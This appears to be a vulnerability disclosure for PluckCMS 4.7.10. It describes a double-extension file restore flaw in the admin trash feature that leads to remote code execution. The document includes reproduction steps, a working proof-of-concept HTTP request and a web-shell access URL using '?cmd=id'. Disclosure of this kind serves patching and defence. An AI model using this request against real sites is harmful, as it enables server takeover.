# Vulnerability Type

Unrestricted File Upload

# Description

File Upload vulnerability in PluckCMS v.4.7.10 allows a remote attacker to execute arbitrary code via the trashcan_restoreitem.php file.

# PoC Report

 ## Environment Setup

 - Software Link: https://github.com/pluck-cms/pluck/
 - Version: 4.7.10
 - Tested on: Windows 10

 ## Exploit Description

A logic flaw exists in the trash recovery mechanism where file names are reconstructed during restore, potentially leading to arbitrary code execution.

 ## Steps to Reproduce

 1. Log in as an admin user.
  2. Intercept and send the malicious request using a web proxy tool such as Burp Suite, ensure it includes a valid session cookie.
  3. The file will be restored and can be accessed through the url.

 ## Proof Of Concept
```
GET /admin.php?action=trash_restoreitem&var1=exploit.php.jpg&var2=file HTTP/1.1
Host: pluck
Cookie: PHPSESSID=[valid_session_id]

**Access Method:**  
http://pluck/files/exploit_copy.php?cmd=id

**Additional Conditions:**  
1. Valid session cookie required (authenticated attack)
2. File `exploit.php.jpg` must exist in `data/trash/files/` before restoration
3. Server must not filter double extensions during file upload/trash operations
```
